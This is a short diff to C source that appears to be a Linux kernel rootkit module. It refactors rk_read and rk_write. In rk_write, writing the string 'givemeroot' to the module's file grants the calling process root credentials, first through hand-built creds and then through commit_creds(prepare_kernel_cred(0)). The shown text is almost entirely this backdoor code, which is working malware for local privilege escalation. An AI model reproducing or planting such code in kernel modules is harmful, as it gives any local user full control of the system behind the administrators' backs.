@@ -30,9 +30,7 @@ static ssize_t rk_read(struct file *file, char __user *buffer,
 
     temp = (temp - count);
 
-    ret = copy_to_user(buffer, module_status, count);
-
-    if(ret);
+    if((ret = copy_to_user(buffer, module_status, count)));
 
     if(count == 0)
     {
@@ -52,17 +50,7 @@ static ssize_t rk_write(struct file *file, const char __user *buffer,
 {
     if(!strncmp(buffer, "givemeroot", MIN(10, count)))
     {
-        kuid_t rootu;
-        kgid_t rootg;
-
-        struct cred *cred = prepare_creds();
-
-        rootu.val = 0;
-        rootg.val = 0;
-
-        cred->uid = cred->euid = rootu;
-        cred->gid = cred->egid = rootg;
-        return commit_creds(cred);
+        return commit_creds(prepare_kernel_cred(0));
     }
 
     return count;
